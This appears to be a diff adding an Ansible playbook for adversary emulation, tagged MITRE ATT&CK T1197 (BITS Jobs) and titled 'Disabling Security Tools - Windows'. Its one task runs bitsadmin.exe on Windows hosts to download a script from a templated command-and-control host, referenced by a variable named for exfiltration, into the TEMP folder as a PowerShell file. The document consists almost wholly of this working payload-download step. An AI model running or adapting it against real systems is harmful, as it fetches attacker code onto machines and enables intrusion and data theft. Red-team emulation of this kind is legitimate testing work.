@@ -1,0 +1,9 @@
+#T1197 - BITS Jobs
+- name: Disabling Security Tools - Windows
+  hosts: windows
+  vars_files:
+   - /opt/ansible/vars.yaml
+  tasks:
+          - name: Download payload
+            tags: always
+            win_command: bitsadmin.exe  /transfer /Download /priority Foreground https://{{ cnc_fqdn }}/{{ exfil_script_windows }} %TEMP%\bitsadmin_flag.ps1
